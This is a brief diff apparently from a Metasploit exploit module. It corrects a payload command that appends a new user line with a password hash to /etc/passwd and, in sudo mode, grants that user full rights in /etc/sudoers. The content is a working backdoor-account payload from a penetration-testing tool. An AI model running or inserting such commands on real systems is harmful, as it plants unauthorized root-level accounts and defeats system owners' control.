@@ -69,7 +69,7 @@ module MetasploitModule
            end
     payload_cmd = "echo \'#{datastore['USER']}:#{datastore['PASS'].crypt('Az')}:#{suid}:#{suid}::/:/bin/sh\'>>/etc/passwd"
     if datastore['RootMethod'] == 'SUDO'
-      payload_cmd += ";echo \'[ -f /etc/sudoers ]&&(echo \'#{datastore['USER']} ALL=(ALL:ALL) ALL\'>>/etc/sudoers)"
+      payload_cmd += ";[ -f /etc/sudoers ]&&(echo \'#{datastore['USER']} ALL=(ALL:ALL) ALL\'>>/etc/sudoers)"
     end
     payload_cmd
   end
